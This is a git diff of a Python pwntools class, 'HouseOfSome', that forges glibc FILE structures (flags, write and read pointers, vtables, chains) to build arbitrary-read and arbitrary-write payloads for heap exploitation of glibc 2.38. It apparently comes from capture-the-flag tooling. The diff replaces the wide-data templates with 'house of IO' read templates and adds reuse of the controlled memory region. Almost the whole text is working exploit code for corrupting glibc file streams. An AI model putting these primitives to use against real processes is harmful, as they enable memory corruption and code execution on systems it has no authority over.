@@ -5,7 +5,6 @@ ref: https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-
 """
 
 from pwn import *
-import time
 # context.arch = "amd64"
 
 class HouseOfSome:
@@ -44,17 +43,18 @@ class HouseOfSome:
         }, filler=b"\x00")
 
         self.fake_file_write_template = lambda buf_start, buf_end, chain, fileno: flat({
-            0x00: 0x800 | 0x1000, # _flags
+            0x00: 0x800 | 0x1000 | 0x8000, # _flags
             
             0x20: buf_start, # _IO_write_base
             0x28: buf_end, # _IO_write_ptr
 
             0x70: p32(fileno), # _fileno
             0x68: chain, # _chain
-            0x88: self.zero_addr,
+            # 0x88: self.zero_addr,
             0xd8: self.libc.symbols['_IO_file_jumps'], # vtable
         }, filler=b"\x00")
 
+        # ref: https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more
         self.hoi_read_file_template = lambda read_addr, len, _chain, _fileno: fit({
             0x00: 0x8000 | 0x40 | 0x1000, #_flags
             0x20: read_addr, #_IO_write_base
@@ -70,26 +70,34 @@ class HouseOfSome:
         self.write_file_length = len(self.fake_file_write_template(0, 0, 0, 0))
         self.hoi_read_file_length = len(self.hoi_read_file_template(0, 0, 0, 0))
 
+        self.panel = max(self.hoi_read_file_length * 2, self.write_file_length + self.hoi_read_file_length)
+        self.switch = 0
+        self.addr_panel = [self.controled_addr, self.controled_addr+self.panel]
+
     def _next_control_addr(self, addr, len):
-        return addr + len
+        # return addr + len
+        """
+        内存复用，仅仅使用self.panel * 2内存即可，防止多次RE后溢出
+        """
+        if len <= self.panel:
+            self.switch = 1 - self.switch
+            return self.addr_panel[self.switch]
+        return self.addr_panel[0] + self.panel * 2
     
     def read(self, fd, buf, len, end=0):
         addr = self.controled_addr
-        f_read_file_0 = self.fake_file_read_template(buf, buf+len, addr+self.read_file_length, addr+self.read_file_length+self.wide_data_length, fd) 
-        f_wide_data = self.fake_wide_data_template()
-        addr += self.read_file_length + self.wide_data_length
-        self.controled_addr = self._next_control_addr(self.controled_addr, (self.read_file_length+self.wide_data_length) * 2)
-        f_read_file_1 = self.fake_file_read_template(self.controled_addr, 
-                                                     self.controled_addr+self.READ_LENGTH_DEFAULT, 
-                                                     addr+self.read_file_length, 
+        f_read_file_0 = self.hoi_read_file_template(buf, len, addr+self.hoi_read_file_length, fd) 
+        # f_wide_data = self.fake_wide_data_template()
+        addr += self.hoi_read_file_length
+        self.controled_addr = self._next_control_addr(self.controled_addr, self.hoi_read_file_length * 2)
+        f_read_file_1 = self.hoi_read_file_template(self.controled_addr, 
+                                                     self.READ_LENGTH_DEFAULT, 
                                                      0 if end else self.controled_addr, 
                                                      0) 
         
         payload = flat([
             f_read_file_0,
-            f_wide_data,
             f_read_file_1,
-            f_wide_data
         ])
         assert b"\n" not in payload, "\\n in payload."
         return payload
@@ -98,15 +106,14 @@ class HouseOfSome:
         addr = self.controled_addr
         f_write_file = self.fake_file_write_template(buf, buf+len, addr+self.write_file_length, fd) 
         addr += self.write_file_length
-        f_wide_data = self.fake_wide_data_template()
-        self.controled_addr = self._next_control_addr(self.controled_addr, self.read_file_length+self.wide_data_length + self.write_file_length)
-        f_read_file_1 = self.fake_file_read_template(self.controled_addr, self.controled_addr+self.READ_LENGTH_DEFAULT, addr+self.read_file_length, self.controled_addr, 0) 
+        self.controled_addr = self._next_control_addr(self.controled_addr, self.hoi_read_file_length + self.write_file_length)
+        f_read_file_1 = self.hoi_read_file_template(self.controled_addr, self.READ_LENGTH_DEFAULT, self.controled_addr, 0) 
         
         payload = flat([
             f_write_file,
             f_read_file_1,
-            f_wide_data
         ])
+        
         assert b"\n" not in payload, "\\n in payload."
         return payload
     
